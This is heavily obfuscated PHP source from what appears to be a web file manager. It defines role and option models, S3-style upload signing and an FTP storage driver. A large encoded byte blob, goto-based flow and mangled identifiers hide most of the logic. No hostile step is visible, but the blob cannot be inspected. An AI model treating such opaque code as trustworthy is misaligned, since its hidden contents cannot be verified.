ğ™1®xƒšQÌaT"9iÈåKäµ×\'Â V&u¸\'»"ˆuû¶#Cp')."\203\332\371\362\244\202\23\341\107\53\310\264\262\364\161\35\16\174\143\5\43\245\104\242\53\303\301\100\244\43\34\137\245\144\165\133\21\152\52\344\51\17\347\122\46\42\144\72\360"."\xc\xab\x93\xfc\xbd\x9\x1c\xf4\x26\xd1\x9\xc2\x9b\xe6\xa7\x2c\x4b\x9c\xa7\xa4\x7\xd4\xa5\x17\xb9\x9c\xd5\x52\xfc\xd3\xcb\x55\x35\x16\xb1\x65\x4e\xbe\xaa\xc\x16\x8c\xd7\xc8\x9d\x17\x62\x60\x29"."\x73\xa9\xac\x57\xe7\x9f\xd0\xb1\x9e\x94\xd4\x62\xa9\x40\xa5\x46\x6b\x20\x7f\xed\x2f\x90\xb7\x40\xe4\xdc\x88\x11\xd2\x8b\x53\x35\xde\x28\x8e\x1a\x96\x21\x16\x3e\x2b\x31\x21\xd7\x1e\xe8\xe8\xe\xf7".strrev('ä^ìJşÉôèU‰wÃ;%p7{µzıLFf‘eß–’„\\Ê®(^¡Öº$H¨')."\70\320\250\364\212\122\251\254\31\226\56\1\350\23\77\263\301\20\106\313\347\35\157\42\346\63\122\264\342\334\131\153\176\112\245\37\140\60\311\253\140\255\14\261\360\312\256\304\377"."\272\251\106\132\170\364\62\322\114\137\206\333\55\322\267\35\202\362\373\231\354\233\125\57\105\175\352\233\123\36\161\363\247\22\77\107\354\161\73\223\34\217\200\167\247\260\160\124\245".base64_decode('Ln/EJxB3Up4oyVev/rSfDzENYMeFIXbfhyPioIKzQ234c/T4ik7lWILIjjRMGofoBA==')."\x8c\xb3\x43\xf5\xc0\xf5\x7a\x96\x5b\xb9\xd6\xf1\x36\x56\xd5\x37\xc8\xab\xd\x34\x8d\xdc\x4b\xa1\x9c\x83\xa2\x73\x28\xc6\x5f\x69\x11\x45\xdd\x29\x35\x1a\x80\x92\x15\x21\xe3\xe2\x19\x94\x36\xa5\x89"."\76\344\306\137\340\120\226\62\53\154\361\1\342\136\54\124\50\331\216\243\175\227\254\141\57\315\15\5\20\116\107\34\237\260\376\227\131\230\250\2\70\4\133\21\326\56\256\13\211".base64_decode('3x8pZkx5/AhBxuYS9MFFKkPwoKODblc/1kSL/38pSBPjkj9JZyXVDbLcW51gu/A7VA==').base64_decode('OXPM+QojhrhfnnK8OSUtGmIsLL+S5SzkqXoHRiEP6CoI1WEWsYcpdiYlmaVPz6I/Aw==').base64_decode('8Mu2M3cjKKGCTzZypArmjHy6zLWcBKBbF4IDUgor+mjsoWDyQl0Ho8nw9Eyt58iw2w==')."\100\347\13\72\342\141\42\261\167\72\37\152\341\167\365\226\130\14\226\355\170\32\50\141\46\264\254\207\162\144\230\252\211\130\373\204\34\226\365\163\111\57\120\42\23\356\245\371\174"."\x2f\x93\x32\xb0\x27\xfe\xd2\x1e\xf2\xe2\x1c\x25\x75\xee\xb7\x6d\xa4\x95\xc6\xe9\xa7\x5c\x3a\x9b\x37\x93\x5a\x3e\x46\xf5\x0\x1d\xc6\x35\x65\x74\x9a\xd2\xd9\x1e\xe0\xc8\x46\x41\x7e\xad\x54\x12\x57"."\x19\xf2\x96\x89\xfe\x77\x18\x35\x42\x5a\x5f\xa2\x4b\x25\xa6\xf9\x2a\x55\x3e\x88\xb\x9c\x93\x2e\x12\x29\x10\x2e\x15\x2b\xc5\x30\xbd\x52\x71\x40\xcb\xd2\x39\x4f\xf6\xc4\x4a\xaf\x59\x84\x19\x1d\x64".base64_decode('R+3spZesMGBylezim4vIO6UH5f3VF+VYwxEoCnmoWiiKELN5+SAGGZSlikANx0LGqA==')._kodDe('MKZy6E8NlAKP0SD37Nc+E8spZsSeOCHhAj23jHV1zwoIiQXaqTJMu9aNppnjkGwrfjU=')."\xc8\x96\xe\xbc\x45\x58\xe3\x81\xc1\x29\xdf\x27\xf4\x8\x8b\xc9\x4f\x7a\x9d\x49\xd8\xf5\x39\xdf\x9f\xc6\xfd\xe0\xac\x1\x3f\x37\x54\x1d\x3d\xdc\xa7\xe\x3e\xac\xae\x2\x31\xf7\x20\x27\xcc\x6a\x79".base64_decode('sVAlcLyeKPUaSFv1C4zSMEj9rpTzHqJV4WHu+Wo+4uh4K8o9oTWegfzUCkH9mhy60g==')."\116\252\327\272\64\131\146\67\316\356\154\206\3\167\325\262\56\154\176\250\307\325\252\15\142\175\41\335\62\167\376\142\131\270\41\246\120\334\303\62\337\376\364\7\270\25\201\24\212"."\23\15\25\346\346\125\136\375\44\321\251\111\137\375\176\250\153\7\370\337\55\30\161\172\240\131\45\75\365\352\227\226\253\106\200\340\251\244\326\45\155\210\56\375\35\23\253\324\130"."\142\325\321\55\120\274\23\352\374\26\145\37\152\364\103\332\367\304\142\241\157\76\232\171\174\306\56\140\131\276\135\326\234\7\312\132\347\46\62\22\354\220\146\220\367\322\165\167\333"."\xc9\xc0\x80\x34\x45\x24\x4b\x7\x2b\xb9\x46\xdb\x74\x8b\x82\x70\x71\xbc\x2f\x12\xb1\x66\xb4\x98\x87\x6d\x1b\xdb\x88\x8b\xd5\x26\x51\xa2\xff\xc5\x4\xb2\x33\x12\x3d\x4e\x9\xd5\x2e\xdc\x7d\xc7\xd1"."\332\71\12\376\25\214\314\324\170\337\123\322\152\371\204\76\120\116\217\237\15\275\232\355\225\220\123\22\45\352\166\224\114\66\220\13\161\204\165\366\333\125\75\52\46\352\30\364\50".strrev('>¼‘R:;e•^Kc®–A p ‰çä™dèÃb'."\0".'é™¥ÃÑ‰1G…@g¤÷fªeS')."\252\253\226\36\203\24\22\42\42\122\202\36\301\342\46\312\17\244\231\201\225\334\374\122\223\364\364\234\142\53\74\324\322\23\276\246\34\26\123\200\267\200\50\363\117\213\276\356\70"."\166\242\170\207\353\261\147\102\256\334\57\100\263\41\42\64\102\220\77\311\212\327\161\306\341\317\341\71\316\74\226\373\115\114\304\371\311\376\246\121\324\375\132\60\320\111\142\252\103"."\277\46\355\264\142\123\25\241\236\112\101\104\44\131\57\71\136\361\104\207\261\63\166\223\345\42\11\314\204\332\162\275\210\113\275\377\322\60\73\5\374\377\176\16\362\377\326\53\220"."\363\233\230\124\336\361\110\364\112\340\305\31\373\67\51\171\33\247\22\141\127\77\234\273\351\64\300\42\376\72\272\24\347\312\335\314\125\32\363\240\246\261\233\61\55\237\227\366\334".base64_decode('2qeXqqd4EfIN83dda0XcpoDuZ3n72Qv25MXdwVoZBRnih6QaeExBjDeW3mY3UsM1rg==')."\xb9\x89\x72\xab\xd3\x5b\xb7\xc4\x8b\x54\x65\x13\x6d\x40\x2c\xb\xf3\x41\xe7\x67\xa1\x14\x3e\x1d\x12\xc7\x10\x30\x7a\xb2\xd\x6f\xb4\xc4\xce\x91\x8d\x40\xf4\x7\x57\x30\xe2\x44\x1c\x6\x0\x8d\x92"."\xe9\x92\x3\x54\x45\xcd\x12\x8e\x39\x71\x0\xe5\xe1\x86\x39\xc4\x56\xd0\x6c\x3a\x1d\x25\xba\x5d\xcf\x8f\xd2\x4c\x96\x3c\xb6\xe\x49\x7e\xb5\xd6\x43\x75\x69\x4e\x7\xe4\x22\x58\xa7\xde\x29\xdc\xe2"."\x2f\xc7\x37\xb9\x9f\x92\x6f\xf6\xba\xaa\xe3\x2f\xb0\x3a\x71\xdd\xf1\x24\x28\xd5\x14\x41\xb\x24\x86\x25\x1e\x4c\x86\x45\x2e\x83\xc8\xad\xb0\xb7\xba\xc\xc5\xeb\xb8\xc8\x33\xc5\xca\xaa\xbd\xbe\x79".base64_decode('o4RAD4fk8WB0ordsEr7QCeVSIEnNWXoBvYrVo+BZvqpNipFMx0xh1TreEMMkXv9Z0Q==')."\276\356\6\142\324\5\210\216\16\47\235\246\100\31\351\71\162\274\60\205\233\114\254\324\115\344\221\62\37\300\114\52\45\63\5\0\71\244\206\226\374\300\212\263\44\66\74\161\56".strrev('>V"£]$ck€!ßñè'."\n".'È¸~àà<H¦;m%?'."\r".'9RÊb1yZğãe%²Ì¥²µeÁ')."\355\174\11\206\44\22\60\363\250\12\65\110\27\201\316\173\130\356\242\276\212\334\126\214\210\224\114\112\61\107\175\350\27\233\235\206\205\37\16\222\114\257\70\2\243\32\167\165\343"."\56\345\174\300\136\272\265\115\21\204\14\125\137\314\211\373\102\211\131\141\305\360\71\113\354\43\56\170\255\367\330\63\332\250\340\264\4\247\237\116\167\152\243\65\262\246\331\131\207"."\103\21\204\147\45\234\232\144\261\55\314\51\364\61\367\203\325\76\331\312\333\221\261\32\52\54\272\245\362\342\212\106\164\23\303\152\165\237\54\64\147\161\331\142\234\43\225\0\321".strrev('±—¦Çä²JáÛiË9×PyZØ‡”3Ÿ<éö\'Ä…v÷B :ÂªtƒŠ¸<·').base64_decode('sjRDQgE9H5Gqky9qpywQr/0RgZXOIZYM+0UC2yFNx+BLJJJ3DHLG5ERHc9xTS441Ag==').base64_decode('fSmwQITENC3gTKL5dVfr5QLuntESsvDBAR8z7FROOoNVJ1bDy1WDDQ2o3Q93a9lYuw==').strrev('x=Wº)¬U­œ¤®5\\+2Ul¸I¥—'."\0".'†)ÙGax).hÅš¢ÚF³	 ZHöª’¢¦O')."\x20\xe9\x48\xd7\xe8\xb0\x90\x7\x48\x59\xa7\x1a\xcf\x9a\x99\xab\x3f\x7\x98\xe8\xce\x4d\x44\x23\xb5\x5b\x21\x24\x1a\xae\xdb\xf8\x5a\xad\xa8\x99\x79\xca\x56\x88\xdc\xae\xdd\xa1\x16\xd\x66\x29\x35".strrev('¦‡¸.‰.§,1I«²­©HVY#Uïö]­âOĞèjÒ/òj­¨jS(¥.¨')."\220\21\235\122\363\306\260\320\325\143\252\373\263\34\333\102\245\70\134\64\371\126\223\26\252\230\130\255\74\120\166\217\163\125\155\116\64\56\126\44\217\273\65\55\11\74\130\246\120"."\175\172\317\153\334\276\113\250\63\321\343\226\151\33\51\335\351\326\127\166\363\105\323\331\107\362\222\300\322\45\53\24\22\16\207\256\103\15\11\32\1\1\73\50\304\366\264\76\211".base64_decode('0RE44TD0oewF3HbQi9IgvpDnV2TEJS3djmly3CzbHpyWMEvkt920baE4QEUKhIfEew==').strrev('Œ'."\0".'—.¸¬íº¸L·‘àˆåš¦qêÏ‹ep‚CêÚZ.E†q!A‹ÒGª').base64_decode('k+Y4862F3Q6I9ogrHs3NJwoWB1BR1vIhzh0sP03xw6MRXlIHPFHnGyplHcXp415cGw==')."\367\223\152\0\61\257\250\202\172\214\47\62\67\60\104\212\47\342\125\111\275\201\170\174\155\64\326\101\35\314\127\45\223\122\222\326\124\125\122\157\127\264\147\252\264\120\167\40\34".base64_decode('qUrDClY9qvDSRpPCvaSV5JZyqlaEg6tES8h9uLg9wE+McrkJPU/EtTyTD0jSZb0g3A==')."\363\211\62\116\261\207\74\257\26\363\243\311\3\316\327\232\134\172\214\14\141\241\42\254\34\325\3\165\307\112\0\305\16\367\371\272\347\274\270\154\206\51\56\373\175\16\245\0\11"."\x4e\xd6\x9\x21\x3c\x12\xfe\xc9\xfb\x33\x1\xcc\xae\x39\x58\xb2\xe4\xb9\xfa\x56\x84\xa4\x8a\xc1\xc0\x8d\x3c\xc1\x4\x2d\xbb\x21\x33\x29\xdd\x7a\xd0\x53\x11\x58\xe\xc3\xf0\x4a\xca\x70\x34\xec\x48".base64_decode('trVszbtxKmHElEDI/v4PuDQObgiwAAA='), 10, -8))); goto AÊËŒÃµé; c‰”éŠ†Š’: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\157\160\164\x69\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\162\x6f\x6c\145", "\162\157\154\145\107\162\x6f\x75\160", "\162\145\x67\x69\163\164", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÒÔÙæåå) { return "\123\x79\163\x74\145\155\117\x70\x74\x69\x6f\x6e\x5f{$ÒÔÙæåå}"; } protected function optionDefault($²Åãğ½± = '') { $…­¶œôç =& $_SERVER[•Ùç É]; if ($²Åãğ½± == $…­¶œôç[12]) { return $GLOBALS[$…­¶œôç[6]][$…­¶œôç[427]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\162\157\x6c\145\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\165\x74\x68", "\154\141\x62\x65\154", "\144\151\x73\x70\x6c\141\x79", "\163\x79\x73\x74\145\x6d", "\144\x65\163\143", "\x69\147\156\157\x72\145\x45\x78\x74", "\x69\147\156\157\162\x65\x46\x69\x6c\x65\x53\151\x7a\145", "\x61\x64\x6d\x69\156\x69\163\164\162\x61\164\157\x72", "\x73\157\x72\x74"); public function listData($»ÌŠ… = false, $ä¾†ª¥õ = "\163\157\x72\164", $ìŸÙĞÊÂ = false) { $½òŞÀÉ‘ =& $_SERVER[•Ùç É]; $ÄÍÏÉš× = parent::listData($»ÌŠ…, $ä¾†ª¥õ, $ìŸÙĞÊÂ); if (!$»ÌŠ…) { foreach ($ÄÍÏÉš× as $¶¶§ƒğì => $ç¦©ò¯) { if ($ç¦©ò¯[$½òŞÀÉ‘[2107]] == 1) { $ÄÍÏÉš×[$¶¶§ƒğì][$½òŞÀÉ‘[496]] = LNG($½òŞÀÉ‘[2347]); } } } return $ÄÍÏÉš×; } public function update($ôÒ§€, $è˜¡Û‡) { $¡õŸÉ’  =& $_SERVER[•Ùç É]; $Ê¨æâ“Ò = parent::listData($ôÒ§€); $Ú´ì«¾í = $this->findByName($è˜¡Û‡[$¡õŸÉ’ [32]]); if (!$Ê¨æâ“Ò || $Ú´ì«¾í && $Ú´ì«¾í[$¡õŸÉ’ [445]] != $Ê¨æâ“Ò[$¡õŸÉ’ [445]]) { return !1; } if ($Ú´ì«¾í[$¡õŸÉ’ [2107]] == 1) { $è˜¡Û‡ = array($¡õŸÉ’ [32] => $è˜¡Û‡[$¡õŸÉ’ [32]], $¡õŸÉ’ [1927] => $è˜¡Û‡[$¡õŸÉ’ [1927]]); } $this->filterAuth($è˜¡Û‡[$¡õŸÉ’ [457]]); return parent::update($ôÒ§€, $è˜¡Û‡); } public function remove($¹æš†Êô) { $˜”ÜÒ = parent::listData($¹æš†Êô); if (!$˜”ÜÒ || $˜”ÜÒ[$_SERVER[•Ùç É][181]]) { return !1; } return parent::remove($¹æš†Êô); } public function add($ÃèŸ‘Ù) { $¬£ÊáÚ’ =& $_SERVER[•Ùç É]; $ü§ğ¶‘í = $ÃèŸ‘Ù[$¬£ÊáÚ’[32]]; if ($this->findByName($ü§ğ¶‘í)) { return !1; } $¦ø†„Ş = array($¬£ÊáÚ’[464] => $ü§ğ¶‘í, $¬£ÊáÚ’[1910] => $¬£ÊáÚ’[12], $¬£ÊáÚ’[1906] => $¬£ÊáÚ’[1914], $¬£ÊáÚ’[2348] => 1, $¬£ÊáÚ’[1909] => 0, $¬£ÊáÚ’[2349] => 0, $¬£ÊáÚ’[1908] => $this->getSort()); $ÃèŸ‘Ù = array_merge($¦ø†„Ş, $ÃèŸ‘Ù); $this->filterAuth($ÃèŸ‘Ù[$¬£ÊáÚ’[457]]); return parent::insert($ÃèŸ‘Ù); } private function getSort() { $ÔÈç‘·ç =& $_SERVER[•Ùç É]; $äŞöî = parent::listData(); $öÇÀóÊ = array_to_keyvalue($äŞöî, $ÔÈç‘·ç[12], $ÔÈç‘·ç[1928]); return empty($öÇÀóÊ) ? 0 : max($öÇÀóÊ) + 1; } private function filterAuth(&$¢¿„òàî) { $’¦¿ç™Ê =& $_SERVER[•Ùç É]; $³µ™Ø§Ó = array(); $üä¿Ô¯ = array_filter(explode($’¦¿ç™Ê[50], $¢¿„òàî)); foreach ($üä¿Ô¯ as $¢¿„òàî) { $®á§ˆúÆ = explode($’¦¿ç™Ê[10], $¢¿„òàî); if ($®á§ˆúÆ[0] == $’¦¿ç™Ê[2350] && $®á§ˆúÆ[1] != $’¦¿ç™Ê[1241]) { $ÍıÕ£ÅŸ = $®á§ˆúÆ[0] . $’¦¿ç™Ê[10] . $®á§ˆúÆ[1] . $’¦¿ç™Ê[2351]; if (!in_array($ÍıÕ£ÅŸ, $üä¿Ô¯)) { $³µ™Ø§Ó[] = $ÍıÕ£ÅŸ; } } $³µ™Ø§Ó[] = $¢¿„òàî; } $¢¿„òàî = implode($’¦¿ç™Ê[50], $³µ™Ø§Ó); } public function findRoleDefault() { $æé°È¯ò =& $_SERVER[•Ùç É]; $²¼ºäéØ = parent::listData(); $§ÏÓÊÔ” = !1; foreach ($²¼ºäéØ as $šÚæöşæ) { if (!$šÚæöşæ || $šÚæöşæ[$æé°È¯ò[1926]] == $æé°È¯ò[214] || $šÚæöşæ[$æé°È¯ò[2107]] == 1) { continue; } if (strstr($šÚæöşæ[$æé°È¯ò[457]], $æé°È¯ò[2352])) { continue; } if (!strstr($šÚæöşæ[$æé°È¯ò[457]], $æé°È¯ò[2353])) { continue; } if (!$§ÏÓÊÔ”) { $§ÏÓÊÔ” = $šÚæöşæ; continue; } $¿¦¤óûí = explode($æé°È¯ò[50], $§ÏÓÊÔ”[$æé°È¯ò[457]]); $ÛÖº­Öê = explode($æé°È¯ò[50], $šÚæöşæ[$æé°È¯ò[457]]); if (count($¿¦¤óûí) > count($ÛÖº­Öê)) { $§ÏÓÊÔ” = $šÚæöşæ; } } return $§ÏÓÊÔ” ? $§ÏÓÊÔ”[$æé°È¯ò[445]] : $æé°È¯ò[12]; } public function sort($‚–óĞÆù, $¡ØïËúë) { return parent::update($‚–óĞÆù, $¡ØïËúë); } } goto A„È ¼–÷; fíëö¢ßóí: class PathDriverEDS extends PathDriverMinIO { public function __construct($—ÆÔ¤°“) { parent::__construct($—ÆÔ¤°“); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÂÄÃø†) { parent::__construct($ÂÄÃø†); $this->signatureVersion($_SERVER[•Ùç É][233]); } public function uploadFormData($ÚÚ©Êµõ, $µÙÌ‚´‹ = 3600) { $¹¯Œöâñ =& $_SERVER[•Ùç É]; $“Ñ‰ûÉ¡ = $¹¯Œöâñ[215]; $Úî³–Ï— = $¹¯Œöâñ[255]; $€¡ª§· = $¹¯Œöâñ[62]; $İÔÃÍ„Å = gmdate($¹¯Œöâñ[256]); $®Ñìú›Ú = gmdate($¹¯Œöâñ[257]); $‰Ä·âÖà = $¹¯Œöâñ[258]; $¤š‘ê’è = $µÙÌ‚´‹ . $¹¯Œöâñ[12]; $Ä´ÎÌ = $¹¯Œöâñ[259]; $“ÍÏñçú = array($this->accessKey, $®Ñìú›Ú, $this->region, $€¡ª§·, $‰Ä·âÖà); $š‘â‡ì = implode($¹¯Œöâñ[8], $“ÍÏñçú); $åıƒç“à = array($¹¯Œöâñ[260] => gmdate($¹¯Œöâñ[1376], strtotime($¹¯Œöâñ[262])), $¹¯Œöâñ[263] => array(array($¹¯Œöâñ[264] => $this->bucket), array($¹¯Œöâñ[265] => $“Ñ‰ûÉ¡), array($¹¯Œöâñ[266], $¹¯Œöâñ[267], $¹¯Œöâñ[12]), array($¹¯Œöâñ[266], $¹¯Œöâñ[268], $¹¯Œöâñ[12]), array($¹¯Œöâñ[266], $¹¯Œöâñ[269], $¹¯Œöâñ[12]), array($¹¯Œöâñ[270] => $Ä´ÎÌ), array($¹¯Œöâñ[271] => $š‘â‡ì), array($¹¯Œöâñ[272] => $Úî³–Ï—), array($¹¯Œöâñ[273] => $İÔÃÍ„Å), array($¹¯Œöâñ[274] => $¤š‘ê’è))); $°æò ş = base64_encode(json_encode($åıƒç“à)); $áş¶ó¿ = hash_hmac($¹¯Œöâñ[275], $®Ñìú›Ú, $¹¯Œöâñ[276] . $this->secret, !0); $ªúä¿ú = hash_hmac($¹¯Œöâñ[275], $this->region, $áş¶ó¿, !0); $ªïÓ›¤ = hash_hmac($¹¯Œöâñ[275], $€¡ª§·, $ªúä¿ú, !0); $£óÀ‰æè = hash_hmac($¹¯Œöâñ[275], $‰Ä·âÖà, $ªïÓ›¤, !0); $øéàÄğ = hash_hmac($¹¯Œöâñ[275], $°æò ş, $£óÀ‰æè); $›½¾³Ö = array($¹¯Œöâñ[232] => $¹¯Œöâñ[12], $¹¯Œöâñ[277] => $¹¯Œöâñ[12], $¹¯Œöâñ[265] => $“Ñ‰ûÉ¡, $¹¯Œöâñ[270] => $Ä´ÎÌ, $¹¯Œöâñ[278] => $°æò ş, $¹¯Œöâñ[279] => $š‘â‡ì, $¹¯Œöâñ[280] => $Úî³–Ï—, $¹¯Œöâñ[281] => $İÔÃÍ„Å, $¹¯Œöâñ[282] => $¤š‘ê’è, $¹¯Œöâñ[283] => $øéàÄğ, $¹¯Œöâñ[198] => $this->getHost()); return $›½¾³Ö; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ Ãß³¾ã) { parent::__construct(); if (count($ Ãß³¾ã) > 0) { $this->_init($ Ãß³¾ã); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ƒÇ·©êî) { $àÆäÌš› =& $_SERVER[•Ùç É]; global $config; $this->appCharset = $config[$àÆäÌš›[1402]]; $this->systemCharset = $config[$àÆäÌš›[1403]]; if (isset($ƒÇ·©êî[$àÆäÌš›[1404]]) && $ƒÇ·©êî[$àÆäÌš›[1404]]) { $this->systemCharset = $ƒÇ·©êî[$àÆäÌš›[1404]]; } } public function iconvApp($à‰¨´Êß) { return $this->iconvTo($à‰¨´Êß, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÍÊıÉ¤) { return $this->iconvTo($ÍÊıÉ¤, $this->appCharset, $this->systemCharset); } public function getPathOuter($İéØÜ¦¼) { $Á™…“ß« =& $_SERVER[•Ùç É]; $¶¢ûšÀã = $this->iconvApp($this->pathBase); $İéØÜ¦¼ = $this->iconvApp($İéØÜ¦¼); if (substr($¶¢ûšÀã, 0, 2) == $Á™…“ß«[1405]) { $¶¢ûšÀã = BASIC_PATH . substr($¶¢ûšÀã, 2); } if (substr($İéØÜ¦¼, 0, 2) == $Á™…“ß«[1405]) { $İéØÜ¦¼ = BASIC_PATH . substr($İéØÜ¦¼, 2); } $¶¢ûšÀã = KodIO::clear($¶¢ûšÀã); $İéØÜ¦¼ = KodIO::clear($İéØÜ¦¼); $İéØÜ¦¼ = substr($İéØÜ¦¼, strlen($¶¢ûšÀã)); if (empty($this->pathDriver)) { return $İéØÜ¦¼; } return $this->pathDriver . $Á™…“ß«[8] . ltrim($İéØÜ¦¼, $Á™…“ß«[8]); } private function _init($Š°½ß¤× = array()) { $Øµ•ƒ‡ =& $_SERVER[•Ùç É]; if (!function_exists($Øµ•ƒ‡[1406])) { throw new Exception(LNG($Øµ•ƒ‡[1407])); } $this->config = $Š°½ß¤×; $this->charsetReset($Š°½ß¤×); foreach ($Š°½ß¤× as $Ñ°¦¦å => $³÷‘Âåä) { if (isset($this->{$Ñ°¦¦å})) { $this->{$Ñ°¦¦å} = $³÷‘Âåä; } } return $this->_login($Š°½ß¤×); } private function _login($òÍæÔ±‰) { $ãã¼Ó¯Õ =& $_SERVER[•Ùç É]; static $Å”¶øœò = array(); $Æ àåï  = md5(json_encode($òÍæÔ±‰)); if (isset($Å”¶øœò[$Æ àåï ])) { foreach ($Å”¶øœò[$Æ àåï ] as $¾æ‘äô» => $áç‚ª˜) { $this->{$¾æ‘äô»} = $áç‚ª˜; } return !0; } $—ªª¡½” = parse_url(trim($this->server, $ãã¼Ó¯Õ[8])); $this->host = $—ªª¡½”[$ãã¼Ó¯Õ[198]]; $´·ÌÂğ– = isset($—ªª¡½”[$ãã¼Ó¯Õ[197]]) && $—ªª¡½”[$ãã¼Ó¯Õ[197]] == $ãã¼Ó¯Õ[1408] ? !0 : !1; $this->scheme = $´·ÌÂğ– ? $ãã¼Ó¯Õ[1409] : $ãã¼Ó¯Õ[1410]; $this->port = isset($—ªª¡½”[$ãã¼Ó¯Õ[199]]) ? $—ªª¡½”[$ãã¼Ó¯Õ[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $š¾˜Ñí = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $áÖÖã… = $this->pasv == $ãã¼Ó¯Õ[90] ? !0 : !1; @ftp_pasv($this->connect, $áÖÖã…); $Å”¶øœò[$Æ àåï ] = array($ãã¼Ó¯Õ[1411] => $this->connect, $ãã¼Ó¯Õ[198] => $this->host, $ãã¼Ó¯Õ[197] => $this->scheme, $ãã¼Ó¯Õ[199] => $this->port); return $š¾˜Ñí; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¼¯ã¶š, $´Ãö³£ = '', $¸¼÷¥üÀ = REPEAT_RENAME) { if ($this->setContent($¼¯ã¶š, $´Ãö³£)) { return $this->getPathOuter($¼¯ã¶š); } return !1; } public function mkdir($æÇİ…¥, $ô‹§¶§ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $æÇİ…¥ = $this->iconvSystem($æÇİ…¥); if ($this->_isFolder($æÇİ…¥) || @ftp_mkdir($this->connect, $æÇİ…¥)) { return $this->getPathOuter($æÇİ…¥); } if (!$this->mkdir($this->pathFather($æÇİ…¥))) { return !1; } if ($æÇİ…¥ = @ftp_mkdir($this->connect, $æÇİ…¥)) { return $this->getPathOuter($æÇİ…¥); } return !1; } public function copyFile($ì÷¹¬©â, $ä­‘±µ) { if (!$this->_isconn()) { return !1; } $ÓÂ×Ôš‹ = $this->pathThis($this->iconvSystem($ì÷¹¬©â)); $±„î’€Ğ = $this->tempFile($ÓÂ×Ôš‹); $Äì—Ş½ = $this->iconvApp($±„î’€Ğ); $this->download($ì÷¹¬©â, $Äì—Ş½); $ÔëÌÇà¤ = $this->upload($ä­‘±µ, $Äì—Ş½); $this->tempFileRemve($±„î’€Ğ); return $ÔëÌÇà¤; } public function moveFile($üå®öüœ, $î„ŸŒğ“) { if (!$this->_isconn()) { return !1; } $üå®öüœ = $this->iconvSystem($üå®öüœ); $î„ŸŒğ“ = $this->iconvSystem($î„ŸŒğ“); $®÷µÄ“ = @ftp_rename($this->connect, $üå®öüœ, $î„ŸŒğ“); return $®÷µÄ“ ? $this->getPathOuter($î„ŸŒğ“) : !1; } public function delFile($ğÀÀŞ¨) { if (!$this->_isconn()) { return !1; } $ğÀÀŞ¨ = $this->iconvSystem($ğÀÀŞ¨); return @ftp_delete($this->connect, $ğÀÀŞ¨); } public function delFolder($Û¹Ì¢í) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $©­Ü±â = $–¤ä¼’À = array(); $this->fileList($Û¹Ì¢í, $©­Ü±â, $–¤ä¼’À, !0); $this->listItemCache = !0; foreach ($–¤ä¼’À as $î…Ëı†Á) { $ìÔÂ¸±Û = $this->iconvSystem($î…Ëı†Á[$_SERVER[•Ùç É][32]]); $ Ó„ˆ¸‡ = @ftp_delete($this->connect, $ìÔÂ¸±Û); if (!$ Ó„ˆ¸‡) { return !1; } } foreach ($©­Ü±â as $ìÔÂ¸±Û) { $ìÔÂ¸±Û = $this->iconvSystem($ìÔÂ¸±Û); $ Ó„ˆ¸‡ = @ftp_rmdir($this->connect, $ìÔÂ¸±Û); if (!$ Ó„ˆ¸‡) { return !1; } } $Û¹Ì¢í = $this->iconvSystem($Û¹Ì¢í); return @ftp_rmdir($this->connect, $Û¹Ì¢í); } public function rename($µÜÓû…ğ, $‘¨³„÷ë) { $—¥¢ÂĞó =& $_SERVER[•Ùç É]; if (!$this->_isconn()) { return !1; } $¦Ò©ÁïĞ = $this->fileNameAuto($this->pathFather($µÜÓû…ğ), $‘¨³„÷ë); $¦Ò©ÁïĞ = $this->iconvSystem($¦Ò©ÁïĞ); $µÜÓû…ğ = $this->iconvSystem($µÜÓû…ğ); $öô…Ò¢º = $this->pathFather($µÜÓû…ğ); $ĞÆ›Åß› = rtrim($öô…Ò¢º, $—¥¢ÂĞó[8]) . $—¥¢ÂĞó[8] . $¦Ò©ÁïĞ; $×˜»Àß = @ftp_rename($this->connect, $µÜÓû…ğ, $ĞÆ›Åß›); $ĞÆ›Åß› = $this->iconvApp($ĞÆ›Åß›); return $×˜»Àß ? $this->getPathOuter($ĞÆ›Åß›) : !1; } private function folderInfo($İıî’Ë, $×ÑÌÒûƒ = false) { $éª§Ğ°“ =& $_SERVER[•Ùç É]; $Ëé¨Äçô = array($éª§Ğ°“[32] => $this->pathThis($İıî’Ë), $éª§Ğ°“[86] => $this->getPathOuter($éª§Ğ°“[8] . $İıî’Ë), $éª§Ğ°“[33] => $éª§Ğ°“[77]); if ($×ÑÌÒûƒ) { return $Ëé¨Äçô; } $Ëé¨Äçô[$éª§Ğ°“[217]] = $Ëé¨Äçô[$éª§Ğ°“[87]] = 0; $Ëé¨Äçô[$éª§Ğ°“[218]] = $Ëé¨Äçô[$éª§Ğ°“[219]] = !0; return $Ëé¨Äçô; } private function fileInfo($ÁÍ¯äé¥, $­ä¸ä…´ = false, $íë÷ì = array()) { $ÔèÃ´ºÕ =& $_SERVER[•Ùç É]; $Ÿª„õ©° = array($ÔèÃ´ºÕ[32] => $this->pathThis($ÁÍ¯äé¥), $ÔèÃ´ºÕ[86] => $this->getPathOuter($ÔèÃ´ºÕ[8] . $ÁÍ¯äé¥), $ÔèÃ´ºÕ[33] => $ÔèÃ´ºÕ[216], $ÔèÃ´ºÕ[78] => isset($íë÷ì[$ÔèÃ´ºÕ[78]]) ? $íë÷ì[$ÔèÃ´ºÕ[78]] : 0, $ÔèÃ´ºÕ[177] => $this->ext($ÁÍ¯äé¥)); if 